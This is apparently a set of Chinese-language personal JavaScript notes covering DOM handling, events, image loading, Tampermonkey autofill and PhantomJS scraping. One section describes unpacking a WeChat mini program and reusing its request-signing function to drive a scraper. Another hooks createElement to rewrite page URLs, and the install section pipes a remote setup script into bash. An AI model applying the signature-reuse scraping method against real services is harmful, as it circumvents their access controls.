\u800cgetElementsByTagName\u662f\u53d6\u503c\u7684\u65f6\u5019\u6267\u884c\u6548\u7387\u66f4\u9ad8 \u5bf9\u5143\u7d20\u5217\u8868\u904d\u5386\u5e94\u8be5\u8fd9\u4e48\u5199\uff1a [].forEach.call(myElements, doSomethingWithEachElement) myElement.children , myElement.firstElementChild \u53ea\u4f1a\u6709tag\uff0c\u800c myElement.childNodes , myElement.firstChild \u4f1a\u6709\u6587\u672c\u8282\u70b9 \u5982\uff1a myElement.firstChild.nodeType === 3 // this would be a text node \u4fee\u6539class\u548c\u5c5e\u6027 \u00b6 myElement . classList . add ( 'foo' ) myElement . classList . remove ( 'bar' ) myElement . classList . toggle ( 'baz' ) // Set multiple properties using Object . assign () Object . assign ( myElement , { value : 'foo' , id : 'bar' } ) // Remove an attribute myElement . value = null \u9664\u4e86\u76f4\u63a5\u8d4b\u503c\uff0c\u8fd8\u6709\u8fd9\u4e9b\u65b9\u6cd5 .getAttibute(), .setAttribute() and .removeAttribute() \u4f46\u4ed6\u4eec\u4f1a\u76f4\u63a5\u4fee\u6539HTML \u5bfc\u81f4\u91cd\u7ed8 \u53ea\u6709\u6ca1\u6709\u5bf9\u5e94\u5c5e\u6027\u7684\u65f6\u5019\u5982 colspan \u624d\u5e94\u8be5\u8fd9\u4e48\u5e72 \u4fee\u6539CSS \u00b6 myElement . style . marginLeft = '2em' // \u83b7\u5f97\u8ba1\u7b97\u51fa\u6765\u7684 CSS\u5c5e\u6027 getComputedStyle ( myElement ). getPropertyValue ( 'margin-left' ) \u4fee\u6539DOM \u00b6 const myNewElement = document . createElement ( 'div' ) const myNewTextNode = document . createTextNode ( 'some text' ) // Append element1 as the last child of element2 element1 . appendChild ( element2 ) // Insert element2 as child of element 1 , right before element3 element1 . insertBefore ( element2 , element3 ) // Create a clone const myElementClone = myElement . cloneNode () myParentElement . appendChild ( myElementClone ) // \u5220\u9664\u4e00\u4e2a\u8282\u70b9 myElement . parentNode . removeChild ( myElement ) \u5f53\u9700\u8981\u628a\u591a\u4e2a\u5143\u7d20appendChild\u5230\u4e00\u4e2a\u5df2\u7ecf\u5728\u9875\u9762\u4e0a\u7684\u5143\u7d20\u65f6\uff0c\u6bcf\u6b21append\u90fd\u4f1a\u91cd\u7ed8 \u8fd9\u65f6\u5019\u5c31\u5e94\u8be5\u7528 DocumentFragment const fragment = document . createDocumentFragment () fragment . appendChild ( text ) fragment . appendChild ( hr ) myElement . appendChild ( fragment ) \u76d1\u542c\u4e8b\u4ef6 \u00b6 \u4e8b\u4ef6event\u91cc\u9762\u6709 target \u6307\u5411\u8c01\u89e6\u53d1\u7684\u4e8b\u4ef6 const myForm = document . forms [ 0 ] const myInputElements = myForm . querySelectorAll ( 'input' ) Array . from ( myInputElements ) . forEach ( el => { el . addEventListener ( 'change' , function ( event ) { console . log ( event . target . value ) }) }) \u963b\u6b62\u9ed8\u8ba4\u884c\u4e3a \u00b6 .preventDefault() .stopPropagation() \u5b50\u8282\u70b9click\u4e0d\u4f1a\u518d\u5192\u6ce1\u89e6\u53d1\u7236\u8282\u70b9onclick Event delegation \u00b6 \u5bf9\u8868\u5355\u6bcf\u4e2ainput\u4fee\u6539\u65f6\u6267\u884c\uff0c\u76f4\u63a5\u5bf9form\u6dfb\u52a0change\u7684\u4e8b\u4ef6 \u4e0d\u9700\u8981\u5bf9\u6bcf\u4e2ainput\u6dfb\u52a0\uff0c\u8fd9\u6837\u4e5f\u81ea\u52a8\u652f\u6301\u52a8\u6001\u65b0\u6dfb\u52a0\u7684input myForm . addEventListener ( 'change' , function ( event ) { const target = event . target if ( target . matches ( 'input' )) { console . log ( target . value ) } }) \u52a8\u753b \u00b6 \u9700\u8981\u9ad8\u6027\u80fd\u65f6 \u4e0d\u8981\u7528setTimeout \u800c\u4f7f\u7528 requestAnimationFrame const start = window . performance . now () const duration = 2000 window . requestAnimationFrame ( function fadeIn ( now )) { const progress = now - start myElement . style . opacity = progress / duration if ( progress < duration ) { window . requestAnimationFrame ( fadeIn ) } } \u52ab\u6301\u52a8\u6001\u56fe\u7247\u52a0\u8f7d \u4fee\u6539src\u5c5e\u6027 \u00b6 React\u7f51\u7ad9\u5e94\u7528\u5e95\u5c42\u7528\u7684\u662fcreateElement\u65b9\u6cd5\uff08svg\u7b49\u5bf9\u8c61\u7528createElementNS\uff09\uff0c\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301document\u6240\u5c5e\u7c7b\u539f\u578b\u7684createElement\u65b9\u6cd5\u6765\u5b9e\u73b0\u56fe\u7247\u8def\u5f84\u91cd\u5b9a\u5411 \u4f46\u662f\u6ca1\u6709\u8003\u8651\u4f7f\u7528innerHTML\u76f4\u63a5\u8d4b\u503c\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u76ee\u6807\u7ad9\u70b9\u786e\u5b9e\u7528\u4e86\u8fd9\u79cd\u6280\u672f\uff0c\u5927\u4e0d\u4e86\u518d\u52a0\u4e2a\u5b9a\u65f6\u5668\u904d\u5386\u5373\u53ef var dc = HTMLDocument . prototype . createElement ; HTMLDocument . prototype . createElement = function ( tag , options ) { var r = dc . call ( document , tag , options ); if ( tag == \"img\" || tag == 'a' ) { var x = r . setAttribute ; r . setAttribute = function ( a , b ){ if ( a == \"src\" || a == \"href\" ){ if ( b [ 0 ] == \"/\" ) b = b . replace ( \"/\" , window . ROOT ); else { b = b . replace ( \"http://\" , \"/web/0/http/0/\" ); b = b . replace ( \"https://\" , \"/web/0/https/0/\" ); } } return x . call ( r , a , b ); } } return r ; } \u4e0a\u8ff0\u4ee3\u7801\u4f1a\u5c06/\u5f00\u5934\u7684src\u548chref\u5c5e\u6027\u7684\u7b2c\u4e00\u4e2a/\u66ff\u6362\u4e3awindow.ROOT \u52ab\u6301Ajax\u548cfetch \u00b6 \u9700\u8981\u5c06fetch\u4f7f\u7528xhr\u5b9e\u73b0\uff0c\u7136\u540eHook Ajax\u5373\u53ef \u53c2\u89c1\u5b8c\u6574\u7684RVPN\u52ab\u6301\u4ee3\u7801 jshook_preload.js \u80cc\u666f\u77e5\u8bc6\u53c2\u89c1\uff1aRVPN\u7f51\u9875\u7248\u4ecb\u7ecd https://www.cc98.org/topic/4816921/ \u591a\u4e2aAjax\u8bf7\u6c42\u7b49\u5f85\u5168\u90e8\u5b8c\u6210 \u00b6 \u65b9\u6cd5\u5c31\u662f\u628ajQuery\u7684ajax\u51fd\u6570\u8fd4\u56de\u503c\u653e\u5230\u6570\u7ec4\u91cc\u9762\uff0c\u7136\u540e\u7528 $.when.apply(null, \u6570\u7ec4).done \u5373\u53ef \u5b9e\u4f8b\uff1aCC98\u53d1\u7c73\u673a function apiget ( url , callback ){ return $. get ( \"/98api_cache/\" + url , null , callback , \"json\" ); } var async_request = [ check_permission ( topic . boardId )]; var i ; for ( i = from_ ; i >= from_ - 80 ; i -= 20 ){ if ( i < 0 ) break ; async_request . push ( apiget ( \"Topic/\" + topicid + \"/post?from=\" + i + \"&size=20\" , function ( data ){ lastfloors . push . apply ( lastfloors , data ); })) } $. when . apply ( null , async_request ) . done ( function (){ alert ( \"all done\" )} ) \u7b49\u5f85\u56fe\u7247\u52a0\u8f7d\u5b8c\u6210\u540e \u7f29\u5c0f\u8fc7\u5927\u7684\u56fe\u7247 \u00b6 \u9996\u5148\u7b49\u5f85DOM\u8282\u70b9\u5c31\u7eea\uff0c\u627e\u5230\u6240\u6709\u7684img\uff0c\u7b49\u5f85\u56fe\u7247\u52a0\u8f7d\u5b8c\u6210\u540e\u5224\u65ad\u56fe\u7247\u9ad8\u5ea6\u662f\u5426\u5927\u4e8e\u7a97\u53e3\u9ad8\u5ea6\u768480%\uff0c\u5982\u679c\u592a\u957f\u5c31\u8bbe\u7f6e max-width:80vh \uff0c\u53ef\u70b9\u51fb\u5c55\u5f00\uff0c\u518d\u6b21\u70b9\u51fb\u5219\u6298\u53e0\u5e76\u8df3\u81f3\u56fe\u7247\u5f00\u59cb\u7684\u5730\u65b9 ! function ( a ){ \"function\" == typeof define && define . amd ? define ([ \"jquery\" ], a ): \"object\" == typeof exports ? module . exports = a ( require ( \"jquery\" )): a ( jQuery )}( function ( a ){ var b = \"waitForImages\" , c = function ( a ){ return a . srcset && a . sizes }( new Image ); a . waitForImages = { hasImageProperties :[ \"backgroundImage\" , \"listStyleImage\" , \"borderImage\" , \"borderCornerImage\" , \"cursor\" ], hasImageAttributes :[ \"srcset\" ]}, a . expr . pseudos [ \"has-src\" ] = function ( b ){ return a ( b ) . is ( 'img[src][src!=\"\"]' )}, a . expr . pseudos . uncached = function ( b ){ return !! a ( b ) . is ( \":has-src\" ) &&! b . complete }, a . fn . waitForImages = function (){ var d , e , f , g = 0 , h = 0 , i = a . Deferred (), j = this , k = [], l = a . waitForImages . hasImageProperties || [], m = a . waitForImages . hasImageAttributes || [], n =/ url \\ ( \\ s * ([ '\"]?)(.*?) \\1 \\s*\\)/g;if(a.isPlainObject(arguments[0])?(f=arguments[0].waitForAll,e=arguments[0].each,d=arguments[0].finished):1===arguments.length&&\"boolean\"===a.type(arguments[0])?f=arguments[0]:(d=arguments[0],e=arguments[1],f=arguments[2]),d=d||a.noop,e=e||a.noop,f=!!f,!a.isFunction(d)||!a.isFunction(e))throw new TypeError(\"An invalid callback was supplied.\");return this.each(function(){var b=a(this);f?b.find(\"*\").addBack().each(function(){var b=a(this);b.is(\"img:has-src\")&&!b.is(\"[srcset]\")&&k.push({src:b.attr(\"src\"),element:b[0]}),a.each(l,function(a,c){var d,e=b.css(c);if(!e)return!0;for(;d=n.exec(e);)k.push({src:d[2],element:b[0]})}),a.each(m,function(a,c){var d=b.attr(c);return!d||void k.push({src:b.attr(\"src\"),srcset:b.attr(\"srcset\"),element:b[0]})})}):b.find(\"img:has-src\").each(function(){k.push({src:this.src,element:this})})}),g=k.length,h=0,0===g&&(d.call(j),i.resolveWith(j)),a.each(k,function(f,k){var l=new Image,m=\"load.\"+b+\" error.\"+b;a(l).one(m,function b(c){var f=[h,g,\"load\"==c.type];if(h++,e.apply(k.element,f),i.notifyWith(k.element,f),a(this).off(m,b),h==g)return d.call(j[0]),i.resolveWith(j[0]),!1}),c&&k.srcset&&(l.srcset=k.srcset,l.sizes=k.sizes),l.src=k.src}),i.promise()}}); $ ( function (){ $ ( \"img\" ) . waitForImages ( function (){ ( $ ( \"img\" ) . filter ( function (){ return $ ( this ) . height () > document . documentElement . clientHeight * 0.8 }) ) . css ( \"max-height\" , \"80vh\" ) . css ( \"cursor\" , \"pointer\" ) . on ( \"click\" , function (){ if ( $ ( this ) . css ( \"max-height\" ) != \"100%\" ){ $ ( this ) . css ( \"max-height\" , \"100%\" ); } else { $ ( this ) . css ( \"max-height\" , \"80vh\" ); $ ( \"html,body\" ) . animate ({ scrollTop : $ ( this ) . position () . top }, \"fast\" ) } }); })}); CSS inline\u6a21\u7cca\u9884\u89c8\u56fe\u7247 \u00b6 \u53c2\u8003\uff1a https://css-tricks.com/the-blur-up-technique-for-loading-background-images/ \u4f7f\u7528\u4e00\u5f20\u5f88\u5927\u7684\u56fe\u7247\u4f5c\u4e3a\u80cc\u666f\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u9700\u8981\u4e00\u5f20inline\u5230css\u4e2d\u7684\u6a21\u7cca\u80cc\u666f\u56fe\uff0c\u5b8c\u6574\u65b9\u6848\u53c2\u89c1\u4e0a\u8ff0\u94fe\u63a5 \u8fd9\u91cc\u4ecb\u7ecd\u4ece\u4e00\u5f20\u56fe\u7247\u600e\u4e48\u53d8\u6210\u6a21\u7cca\u9884\u89c8\u7684inline CSS: \u9996\u5148\u628a\u56fe\u7247\u53d8\u621040x22\u5927\u5c0f\uff0c\u8fd9\u4e2a\u76f4\u63a5\u7528Windows\u81ea\u5e26\u7684\u753b\u56fe\u5de5\u5177\u5373\u53ef\u5b8c\u6210 \u7136\u540e\u4e22\u7ed9 tinyjpg.com \u518d\u538b\u7f29\u4e00\u4e0b \u7528 base64 -w0 < x.jpg \u83b7\u53d6\u56fe\u7247\u7684base64\u6587\u672c \u653e\u5165\u4e0b\u8ff0svg\u4e2d\uff0c\u518d\u4ea4\u7ed9\u8fd9\u4e2asvg encoder: https://codepen.io/yoksel/details/JDqvs/ < svg xmlns = \"http://www.w3.org/2000/svg\" xmlns : xlink = \"http://www.w3.org/1999/xlink\" width = \"1500\" height = \"823\" viewBox = \"0 0 1500 823\" > < filter id = \"blur\" filterUnits = \"userSpaceOnUse\" color - interpolation - filters = \"sRGB\" > < feGaussianBlur stdDeviation = \"20 20\" edgeMode = \"duplicate\" /> < feComponentTransfer > < feFuncA type = \"discrete\" tableValues = \"1 1\" /> </ feComponentTransfer > </ filter > < image filter = \"url(#blur)\" xlink : href = \"data:image/jpeg;base64,/9j/4AAQSkZJ ...[truncated]...\" x = \"0\" y = \"0\" height = \"100%\" width = \"100%\" /> </ svg > \u6ce8\u610fencoder\u8f93\u51fa\u7684\u5185\u5bb9\u8fd8\u8981\u52a0\u4e0a charset \uff0c\u6700\u7ec8\u6548\u679c\uff1a background-image: url(data:image/svg+xml;charset=utf-8,%3Csvg...); a\u94fe\u63a5\u6539\u7528POST\u8bf7\u6c42 jQuery \u00b6 \u53c2\u8003OneIndex\uff0c\u7528POST\u65b9\u6cd5\u8868\u793a\u6765\u81ea\u6587\u4ef6\u5217\u8868\u7684\u70b9\u51fb\u53ef\u4ee5\u663e\u793a\u7f51\u9875\uff0c\u9ed8\u8ba4\u7684GET\u8bf7\u6c42\u5219\u4e0b\u8f7d\u6587\u4ef6 $('.file a').each(function(){ $(this).on('click', function () { var form = $(' <form target= _blank method= post ></form> ').attr('action', $(this).attr('href')).get(0); $(document.body).append(form); form.submit(); $(form).remove(); return false; }); }); \u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u4e0b\u8f7d Blob \u00b6 \u53c2\u8003OneIndex\u7684 downall \u65b9\u6cd5 Blob\u6587\u6863\uff1ahttps://developer.mozilla.org/zh-CN/docs/Web/API/Blob \u8fd8\u53ef\u4ee5\u770b\u770b\u8fd9\u7bc7\uff1ahttps://juejin.im/post/59e35d0e6fb9a045030f1f35 let blob = new Blob ([ \"\u6587\u6863\u5185\u5bb9\" ], { type : 'text/plain' }); // \u6784\u9020 Blob\u5bf9\u8c61 let a = document . createElement ( 'a' ); // \u4f2a\u9020\u4e00\u4e2a a\u5bf9\u8c61 a . href = window . URL . createObjectURL ( blob ); // \u6784\u9020 href\u5c5e\u6027\u4e3aBlob\u5bf9\u8c61\u751f\u6210\u7684\u94fe\u63a5 a . download = \"666.txt\" ; // \u6587\u4ef6\u540d\u79f0\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u4f60\u7684\u9700\u8981\u6784\u9020 a . click () // \u6a21\u62df\u70b9\u51fb a . remove (); \u722c\u53d6\u5fae\u4fe1\u5c0f\u7a0b\u5e8f \u6735\u6735\u6821\u53cb\u5708 \u00b6 \u5728\u5206\u8eab\u7a7a\u95f4\u4e2d\u5b89\u88c5\u5fae\u4fe1\uff0c\u4f7f\u7528HttpCanary\u6293\u5230wxapkg\u7684url \u7528 https://gist.githubusercontent.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad/raw/a4d5f24f4d0102ce864008a86fdcc6e7888205c0/unwxapkg.py \u8fd9\u4e2a\u5de5\u5177\u5bf9\u5c0f\u7a0b\u5e8f\u89e3\u5305 \u641c\u7d22 duo_session \u5173\u952e\u8bcd\uff0c\u627e\u5230\u5bf9\u5e94\u7684util.js\u7684addSign\uff0c\u7528chrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u683c\u5f0f\u5316\u4ee3\u7801 \u770b\u4e86\u770b\u6574\u6bb5\u4ee3\u7801 \u633a\u590d\u6742\u7684\uff0c\u61d2\u5f97\u7528python\u6539\u5199\uff0c\u5c31\u4fdd\u7559\u539f\u6837js\u4f7f\u7528nodejs\u8c03\u7528\u5427 burpsuite\u9a8c\u8bc1\u786e\u5b9e\u53ef\u884c \u5047\u8bbe\u4f60\u5df2\u7ecf\u6709\u4e86addSign\u65b9\u6cd5 \u90a3\u4e48\u5c31\u63d0\u4f9b\u4e2ahttp\u670d\u52a1\u7ed9python\u722c\u866b\u8c03\u7528\u5427\uff1a var http = require ( \"http\" ); function start ( port ) { function onRequest ( request , response ) { var postData = \"\" ; request . setEncoding ( \"utf8\" ); request . addListener ( \"data\" , function ( postDataChunk ) { postData += postDataChunk ; }); request . addListener ( \"end\" , function () { // console . log ( postData ); console . log ( \"[\" + new Date () . toLocaleString () + \"]\" , request . connection . remoteAddress ); var data = JSON . parse ( postData ); addSign ( data ) response . writeHead ( 200 , { \"Content-Type\" : \"text/html\" }); response . write ( JSON . stringify ( data )); response . end (); }); } http . createServer ( onRequest ) . listen ( port ); console . log ( \"Server has started.\" ); } start ( 8888 ); \u4fdd\u6301\u7279\u5b9a\u5143\u7d20\u76f8\u5bf9\u4e8e\u7a97\u53e3\u7684\u4f4d\u7f6e\u4e0d\u53d8 \u00b6 \u8003\u8651\u8fd9\u6837\u4e00\u4e2a\u573a\u666f\uff1a\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e00\u9879\u90fd\u53ef\u4ee5\u70b9\u51fb\u6765\u5c55\u5f00\u8be6\u60c5div\uff0c\u70b9\u51fb\u65f6\u540c\u65f6\u9690\u85cf\u5176\u4ed6\u7684\u8be6\u60c5\uff08\u540c\u4e00\u65f6\u523b\u53ea\u663e\u793a\u4e00\u4e2a\uff09 \u53d1\u73b0\u4e00\u4e2abug\uff1a\u7279\u5b9a\u60c5\u51b5\u4e0b\uff08\u4e0d\u660e\u539f\u56e0\uff09\uff0c\u7528\u6237\u70b9\u51fb\u540e\u9875\u9762\u4f4d\u7f6e\u53d1\u751f\u4e86\u53d8\u5316\uff1a\u524d\u9762\u7684\u4e00\u4e2a\u6bd4\u8f83\u957f\u7684div\u9690\u85cf\u540e\uff0c\u5f53\u524d\u7684\u4f4d\u7f6e\u8df3\u5230\u4e86\u5f88\u4e0b\u9762\u7684\u5730\u65b9\uff0c\u9700\u8981\u624b\u52a8\u7ffb\u56de\u53bb\uff0c\u7528\u6237\u4f53\u9a8c\u6781\u5dee \u603b\u800c\u8a00\u4e4b\uff0c\u8fdb\u884c\u4e00\u4e9b\u9875\u9762DOM\u64cd\u4f5c\u540e\uff0c\u6211\u4eec\u60f3\u4fdd\u6301\u7279\u5b9a\u5143\u7d20 \u76f8\u5bf9\u4e8e\u7a97\u53e3\u7684\u4f4d\u7f6e \u4e0d\u53d8 \u89e3\u51b3\u65b9\u6848\uff1a\u5728\u5904\u7406\u70b9\u51fbevent\u65f6\uff0c\u5148\u8bb0\u5f55event.target\u76f8\u5bf9\u4e8ewindow\u7684top\u4f4d\u7f6e\uff0c\u5728\u8be6\u60c5div\u9690\u85cf\u4ee5\u53ca\u663e\u793a\u540e\u518d\u6b21\u8bb0\u5f55top\u4f4d\u7f6e\uff0c\u8fd9\u4e24\u4e2a\u4f4d\u7f6e\u4e4b\u95f4\u7684\u5dee\u503c\u5c31\u662f\u9700\u8981\u6eda\u52a8\u9875\u9762\u7684\u591a\u5c11 \u5f53\u8fd9\u4e2a\u5dee\u503c\u5f88\u5c0f\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u5141\u8bb8\u7684\u8bef\u5dee\uff0c\u5b9e\u9645\u6ca1\u6709\u53ef\u89c1\u7684\u53d8\u5316 \u65e0\u9700\u64cd\u4f5c HTML : onclick = \"handle_click(event)\" JS : function fix_position ( et, oldt ){ var newt = et . getBoundingClientRect (). top ; if ( Math . abs ( oldt - newt )< 2 ) return ; $ ( window ). scrollTop ( $ ( window ). scrollTop ()+ newt - oldt ); } function handle_click ( event ){ var et = event . target ; var oldt = et . getBoundingClientRect (). top ; //...code for hide and show divs... fix_position ( et , oldt ); //also include this line to callback function if using ajax } Tampermonkey\u81ea\u52a8\u586b\u5145\u7528\u6237\u540d\u5bc6\u7801\u8868\u5355\uff0c\u5e76\u901a\u8fc7\u524d\u7aef\u7684\u8868\u5355\u68c0\u67e5 \u00b6 \u611f\u8c22 @CoolSpring \u7684\u89e3\u51b3\u65b9\u6848\uff1a https://v2ex.com/t/701749 \u73b0\u4ee3\u5316\u7684\u524d\u7aef\u505a\u4e86\u8868\u5355\u68c0\u67e5\uff0c\u76f4\u63a5\u5bf9input\u8d4b\u503c\u4e0d\u80fd\u901a\u8fc7\u68c0\u67e5\uff0c\u9700\u8981\u8c03\u7528\u88ab\u91cd\u8f7d\u7684setter\u51fd\u6570\uff1a function mytype ( input , value ){ var nativeInputValueSetter = Object . getOwnPropertyDescriptor ( window . HTMLInputElement . prototype , \"value\" ). set ; nativeInputValueSetter . call ( input , value ); input . dispatchEvent ( new Event ( 'input' , { bubbles : true })); } \u7528\u6cd5\uff1a mytype(document.querySelectorAll(\"input\")[0], USERNAME); mytype(document.querySelectorAll(\"input\")[1], PASSWORD); \u4f7f\u7528browserify\u5c06npm\u5305\u6253\u5305\u6210\u6d4f\u89c8\u5668\u80fd\u7528\u7684js\u6587\u4ef6 \u00b6 \u6d4f\u89c8\u5668\u4e0d\u652f\u6301require\uff0c\u600e\u4e48\u5728\u6d4f\u89c8\u5668\u91cc\u4f7f\u7528\u4e00\u4e2anpm\u5305\u5462\uff1f browserify \u793a\u4f8b\uff1a\u6211\u60f3\u5728tampermonkey\u91cc\u4f7f\u7528 user-event \u8fd9\u4e2anpm\u5305\uff0c \u7528\u6765\u5b8c\u6574\u5730\u6a21\u62df\u7528\u6237\u7684\u4ea4\u4e92\uff0c\u8fd9\u4e2a\u5176\u5b9e\u662f\u4e0a\u4e00\u4e2a\u95ee\u9898\u7684\u7b28\u91cd\u7248\u672c\u7684\u89e3\u51b3\u65b9\u6848 # \u5148\u5b89\u88c5\u76ee\u6807\u5e93\u3001browserify\u548cterser cnpm install @ testing - library / user - event @ testing - library / dom -- save - dev cnpm i - g browserify terser # \u5199\u4e00\u4e2amain.js\u5bfc\u5165\u8fd9\u4e2a\u5e93\uff0c\u5bfc\u51fa\u5230window\u91cc var userEvent = require ( '@testing-library/user-event' ); window . userEvent = userEvent . default ; # \u6267\u884c\u6253\u5305 browserify main . js | terser -- compress -- mangle > bundle . js # \u5728tampermonkey\u91cc\u4f7f\u7528 // @ require \u4e0a\u4f20\u5230 cdn\u540e\u7684js\u5730\u5740 userEvent . type ( document . querySelectorAll ( \"input\" )[ 0 ], USERNAME ); Ubuntu\u5b89\u88c5nodejs \u00b6 curl - fsSL https : // deb . nodesource . com / setup_16 . x | bash - curl - sL https : // dl . yarnpkg . com / debian / pubkey . gpg | gpg --dearmor | tee /usr/share/keyrings/yarnkey.gpg >/dev/null echo \"deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main\" | tee / etc / apt / sources . list . d / yarn . list apt update && apt install - y nodejs yarn yarn config set registry https : // registry . npm . taobao . org - g yarn config set disturl https : // npm . taobao . org / dist - g yarn config set electron_mirror https : // npm . taobao . org / mirrors / electron / - g yarn config set sass_binary_site https : // npm . taobao . org / mirrors / node - sass / - g yarn config set phantomjs_cdnurl https : // npm . taobao . org / mirrors / phantomjs / - g yarn config set chromedriver_cdnurl https : // cdn . npm . taobao . org / dist / chromedriver - g yarn config set operadriver_cdnurl https : // cdn . npm . taobao . org / dist / operadriver - g yarn config set fse_binary_host_mirror https : // npm . taobao . org / mirrors / fsevents - g","title":"JavaScript"},{"location":"JavaScript/#localstorage","text":"Cookie\u5b58\u6570\u636e\u5f71\u54cd\u8bbf\u95ee\u901f\u5ea6(\u6bcf\u6b21\u8bf7\u6c42\u90fd\u9700\u8981\u5e26\u4e0aCookie)\uff0c\u4f7f\u7528localStorage\u5b58\u50a8\u6709\u66f4\u5927\u5bb9\u91cf\uff0c\u8fd8\u4e0d\u6613\u4e22\u5931 \u5efa\u8bae\u5c06\u7528\u6237\u7684\u5927\u6bb5\u8f93\u5165\u968f\u65f6\u5b58\u50a8\u5230localStorage\u4e2d \u9ad8\u7ea7\u5e94\u7528\u53ef\u4ee5\u662f\u628ajs\u7b49\u4ee3\u7801\u6587\u4ef6\u8fd9\u6837\u7f13\u5b58\u5230\u672c\u5730\uff0c\u5b89\u5168\u6027\u8ba8\u8bba\u89c1 https://imququ.com/post/enhance-security-for-ls-code.html // \u5199\u5165 var storage = window . localStorage ; storage [ \"a\" ] = 1 ; // \u6e05\u7a7a window . localStorage . clear ();","title":"\u4f7f\u7528localStorage"},{"location":"JavaScript/#phantomjs","text":"\u6709\u4e9b\u65f6\u5019\u6211\u4eec\u7528Python\u7684requests\u5e76\u4e0d\u80fd\u5f88\u5b8c\u7f8e\u5730\u6e32\u67d3\u597d\u7f51\u9875\uff0c\u4f8b\u5982\u4eba\u5bb6\u7528\u9177\u70ab\u7684js\u4f5c\u56fe\u4e86\uff0c\u6211\u5c31\u60f3\u5f97\u5230\u8fd9\u5f20\u56fe\uff0c\u8fd9\u65f6\u5019\u7528phantomjs\u5c31\u597d\u5566 \u722c\u53d6\u76ee\u6807\uff1a http://oncokb.org/#/gene/AKT1 \u8fd9\u4e2a\u7f51\u9875\u7684\u53f3\u8fb9\u6709\u4e00\u5f20Tumor Types with AKT1 Mutations\u7684\u56fe \u4ee3\u7801\uff1a code/spider.oncokb.js \u4ee3\u7801\u7684\u7ec6\u8282\uff1a \u6253\u5f00\u9875\u9762\u4e4b\u524d\u4e3a\u4e86\u622a\u56fe\u65b9\u4fbf\u9700\u8981\u5148\u8bbe\u7f6e\u6d4f\u89c8\u5668\u7684\u5927\u5c0f\uff0c\u8fd9\u91cc\u8bbe\u7f6e\u4e3a\u4e861920*1080 \u4e0d\u8981\u4e00\u6253\u5f00\u9875\u9762\u5c31\u622a\u56fe\uff0c\u800c\u662f\u7b49\u5230\u9875\u9762\u52a0\u8f7d\u597d\u4e86\u6700\u540e\u4e00\u4e2a\u8bf7\u6c42(\u4eceChrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u67e5\u770b\u6700\u540e\u7684\u8bf7\u6c42\u662f\u5565)\u540e\uff0c\u518d\u7b49\u5f855s\u540e\u6267\u884c\u622a\u56fe\u3001\u5bfc\u51faHTML\u5e76\u9000\u51fa \u4e3a\u4e86\u9632\u6b62\u65e0\u9650\u7b49\u5f85\uff0c\u8bbe\u7f6e\u6700\u957f2min\u540etimeout\u9000\u51fa \u4e3a\u4e86\u65b9\u4fbf\u6279\u91cf\u5316\u5904\u7406\uff0c\u4ece\u547d\u4ee4\u884c\u53c2\u6570\u8bfb\u53d6\u9700\u8981\u722c\u53d6\u7684\u57fa\u56e0\u540d\u79f0 \u5728\u8fd0\u884c\u7684\u65f6\u5019\u6709\u8bbe\u7f6e\u4ee3\u7406\u548c\u4e0d\u8981\u8f7d\u5165\u56fe\u7247\u7684\u53c2\u6570\uff0c\u5177\u4f53\u89c1 \u5b98\u65b9\u6587\u6863","title":"\u4f7f\u7528phantomjs\u722c\u53d6\u7f51\u9875"},{"location":"JavaScript/#jqueryshow","text":"\u6211\u7684\u9700\u6c42\uff1a\u7528\u6237\u767b\u5f55\u7684div\u9700\u8981\u70b9\u51fbLogin\u540e\u663e\u793a(toggle)\uff0c\u6b64\u65f6\u6d4f\u89c8\u5668\u5df2\u7ecf\u81ea\u52a8\u5e2e\u7528\u6237\u586b\u4e0a\u4e86\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u7528\u6237\u9700\u8981\u624b\u52a8\u70b9\u51fb\u767b\u5f55\u6309\u94ae\u624d\u4f1a\u89e6\u53d1\u767b\u5f55\u8bf7\u6c42\uff1b\u73b0\u5728\u6211\u60f3\u52a0\u5165\u5feb\u901f\u767b\u5f55\u529f\u80fd\uff0c\u5728\u663e\u793a\u767b\u5f55div\u540e\u81ea\u52a8\u63d0\u4ea4\u767b\u5f55\u8bf7\u6c42\uff0c\u5982\u679c\u4e3a\u7a7a\u6216\u5bc6\u7801\u9519\u8bef\u518d\u4ea4\u7ed9\u7528\u6237\u8f93\u5165 \u6211\u7684\u89e3\u51b3\u65b9\u6848\uff1a\u52a0\u5165\u4e0b\u8ff0\u6269\u5c55jQuery\u7684\u4ee3\u7801\u540e\uff0c\u5bf9#login\u7ed1\u5b9abeforeShow\u4e8b\u4ef6\uff0c\u5904\u7406\u51fd\u6570\u5148\u6839\u636e\u5168\u5c40\u53d8\u91cf\u662f\u5426\u5b58\u5728\u6765\u5224\u65ad\u662f\u5426\u6267\u884c\u8fc7\uff08\u9632\u6b62\u6b7b\u5faa\u73af\uff09\uff0c\u5982\u679c\u6ca1\u6709\u6267\u884c\u8fc7\u5219\u6267\u884c\u767b\u5f55\u51fd\u6570clicklogin\u5e76\u8bbe\u7f6e\u5168\u5c40\u53d8\u91cf 